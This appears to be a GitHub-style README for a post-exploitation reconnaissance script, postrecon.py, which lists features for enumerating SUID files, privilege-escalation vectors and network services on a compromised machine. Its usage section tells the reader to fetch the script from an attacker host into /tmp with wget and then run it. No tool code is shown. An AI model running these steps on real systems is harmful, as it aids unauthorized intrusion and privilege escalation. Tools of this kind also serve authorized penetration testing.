## Post-Exploitation Recon Tool - postrecon.py

## 📌 Overview
This project is a lightweight post-exploitation reconnaissance tool designed to automate the process of gathering critical system information after initial access.

Its primary goal is to help identify potential privilege escalation vectors and provide situational awareness within the compromised system.

---

## ⚙️ Features
- Automated system enumeration SUID files
- Privilege escalation vector discovery
- Environment and user context analysis
- Network and service enumeration
- No root privileges required

---

## 🚀 Usage

# Upload the script to target (recommended location)
cd /tmp
wget http://<your-ip>/postrecon.py

# Make executable
chmod +x postrecon.py

# Run
./postrecon.py
